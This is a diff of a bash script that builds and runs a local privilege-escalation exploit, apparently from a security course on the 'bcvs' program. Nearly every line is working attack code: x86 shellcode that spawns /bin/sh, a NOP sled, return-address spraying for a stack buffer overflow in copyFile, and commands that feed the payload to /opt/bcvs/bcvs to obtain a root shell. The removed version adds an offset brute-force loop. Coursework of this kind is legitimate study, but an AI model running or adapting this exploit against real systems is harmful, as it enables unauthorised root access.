@@ -1,18 +1,10 @@
 #!/bin/bash
 
-## -------------------- Description -------------------- ##
-# Sploit6 takes advantage of a buffer overflow in the checkout conditional
-# of the copyFile function. This sploit is a standard buffer overflow
-# leading to a control flow hijack. The overwritten return pointer of the
-# copyFile function points back up the stack into the approximate region
-# where the buffer has overflowed and hits a nop sled.
-## ----------------------------------------------------- ##
-
-EXPLOIT_EXE="./exploit"
-
-rm -rf exploit
-rm -rf exploit.c
-rm -rf haxor
+## ---------------------- Description ---------------------- ##
+#  This exploit takes advantage of a buffer overflow in the
+#  copyFile function of bcvs. See sploit1.txt for more
+#  information.
+## --------------------------------------------------------- ##
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -24,10 +16,10 @@ cat <<EOS > "exploit.c"
 #define NOP 0x90
 
 // Shellcode for exec of /bin/sh
-char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
-"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
-"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
-
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 unsigned long get_sp(void) {
   __asm__("movl %esp, %eax");
@@ -42,66 +34,43 @@ void main(int argc, char* argv[]) {
 
   if (argc > 1) offset = atoi(argv[1]);
 
-  addr = get_sp() + offset;
-
+  //printf("Offset is: %d\n", offset);
+  //printf("Stack Pointer is: 0x%x\n", get_sp()); 
+  addr = get_sp() - offset;
+  //printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
-
-  long_ptr = (long *) (ptr);
+  // Shifting by 3 align the addresses with the word boundary when
+  // smashing the stack
+  long_ptr = (long *) (ptr + 3);
   //First we fill the buffer with our best guess of the address for
   //the buffer in the attacked program
-  for (i = 0; long_ptr < (buff + 60); i += 4) {
-	*(long_ptr++) = addr;
+  for (i = 0; long_ptr < (buff+bsize-3); i += 4) {
+    *(long_ptr++) = addr;
   }
 
   // Setup the nop sled
-  char *buf_ptr = (char *) (ptr + 60); 
-  for (i = (buff + 60); i < (buff + bsize); ++i) {
-    *(buf_ptr++) = NOP;
-    //buff[i] = NOP;
-  }
+  for (i = 0; i < (bsize/2); ++i)
+    buff[i] = NOP;
 
   // Insert our shellcode
-  ptr = (buff + 186);
+  ptr = buff + (bsize/2);
   for (i = 0; i < strlen(shellcode); ++i) {
     *(ptr++) = shellcode[i];
   }
-
   buff[bsize-1] = '\0';
   printf(buff);
   return;
 }
-
 EOS
-
-
-
 gcc -o exploit exploit.c
 
-SHELL_CODE=$($EXPLOIT_EXE)
+SHELL_CODE=$(./exploit)
+#echo "$SHELL_CODE"
 
-#OFFSET=100
-OFFSET=0
-SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
+OFFSET=425
+echo "Trying offset: $OFFSET"
+SHELL_CODE=$(./exploit $OFFSET)
+/opt/bcvs/bcvs ci "${SHELL_CODE}"
 
-export USER=${SHELL_CODE}
-export PATH=""
-echo ${USER}
-echo ${PATH}
-
-echo "junk" > "dummy_input"
-echo "hey" > "haxor"
-/opt/bcvs/bcvs ci haxor < dummy_input
-
-while [[ $OFFSET -le 200 ]]; do
-SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-export USER=${SHELL_CODE}
-/opt/bcvs/bcvs co haxor < dummy_input
-
-if [[ $(( OFFSET % 25 )) -eq 0 ]]; then
-  echo "Sleeping for 2 seconds to give a chance to escape"
-  /bin/sleep 2
-fi
-((OFFSET++))
-done
 # And then hopefully you have a root shell at this point
